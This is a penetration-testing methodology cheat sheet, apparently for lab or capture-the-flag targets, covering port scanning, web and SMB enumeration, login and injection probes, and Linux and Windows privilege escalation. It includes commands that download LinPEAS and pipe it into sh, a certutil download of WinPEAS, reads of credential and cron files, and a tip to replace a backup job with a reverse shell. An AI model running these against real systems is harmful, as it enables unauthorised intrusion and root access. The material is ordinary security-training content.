# Methodology


## Initial Discovery

1) If you don't know where the target lives, use `netdiscover` to find it

```
sudo netdiscover -i eth0
```

2) Enumerate TCP ports on the target with `nmap`

```
nmap -Pn -v -p- -T4 ${TARGET_HOST}
```

2) Enumerate UDP ports on the target with `nmap`

```
nmap -v -sU -F -T4 ${TARGET_HOST}
```

> The `-F` option will do only the top 100 common UDP ports... (UDP scans are slow)


3) Get service fingerprint info with `nmap`

```
nmap -Pn -v -p ${PORTS_FROM_2} -T4 -A ${TARGET_HOST}
```

4) Take notes of `nmap`'s results

- Any service / versions available
- For HTTP Servers:
  - Any relevant HTTP headers
  - Any hits in robots.txt

## Webserver Enumeration

5) **ALWAYS** check for a `robots.txt` file... usually it will quickly give away some routes (faster than waiting for automated enumeration).

6) Enumerate webserver paths with `gobuster`:

```
gobuster dir -u ${TARGET_URL} -w ${WORDLIST_PATH}
```

Some useful options:

- `-f` will append a trailing slash to all words (`/`)
- `-x '.php,.txt'` will append strings to all words

## Webserver Enumeration (WordPress)

1) Run `wpscan` to determine what plugins/themes/etc are present:

```
wpscan --url ${TARGET}/${WORDPRESS_PATH} --enumerate p
```

## Webserver Form Tampering

7) **ALWAYS** try a handful of well-known bad username+password combinations e.g. `admin:admin`, `admin:password`, ...

8) **ALWAYS** try special characeters like `'` which could reveal the possibility of SQL injection

9) **ALWAYS** try script tags like `<script>alert('hello')</script>` that could reveal the possibility of XSS

...

## Webserver Exploits

1) **ALWAYS** try it before reading the code... to save time

2) If it doesn't work chances are you need to change the code

3) If it still doesn't work, read the code thoroughly. Sometimes the code assumes too much about the target application e.g. that it is hosting the target page / functionality under a certain path.

## SMB Server Enumeration

1) Find unauthenticated SMB shares

```
smbclient -L ${TARGET} -N
```

2) Try connecting to a share

```
smbclient \\\\${TARGET}\\${SHARE_NAME}
```

3) Download files (once in an SMB prompt) (e.g. `smb: \>`)

```
get ${FILENAME}
```

## Privilege Escalation (Linux)

> Quick Notes:
>
> - Print real and effective user and group IDs: `id`
> - Print system information: `uname`
> - Print all cron jobs: `cat /etc/crontab`
> - Print all users `cat /etc/passwd`
> - List commands allowed using sudo: `sudo -l`
> - Find all suid and guid binaries: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

1) Check if you can run any commands as sudo

```
sudo -l
```

Check any hits against [GTFOBins](https://gtfobins.github.io/) to see if the command can be used to get a root shell.

(Pick the "Sudo" function in GTFOBins)

2) Always check for SUID (and GUID) binaries first

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Check them against [GTFOBins](https://gtfobins.github.io/) to see if the command can be used to get a root shell.

(Pick the "SUID" function in GTFOBins)

3) Check for cron jobs running with root privilages

```
cat /etc/crontab
```

4) Run LinPEAS

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

If no cURL on the system try for wget

```
wget -O- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

5) Run [`pspy`](https://github.com/DominicBreuker/pspy)

```
./pspy64 -pf -i 1000
```

## Privilege Escalation (Windows)

1) Check your privileges

```
whoami /priv
```

2) Check for a `Backup` dir on the C drive. Sometimes there are scheduled backup jobs running as Administrator. If yes, replace the executable with a reverse shell.

3) Run WinPEAS

```
certutil.exe -urlcache -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe winpeasany.exe
```

```
winpeasany.exe
```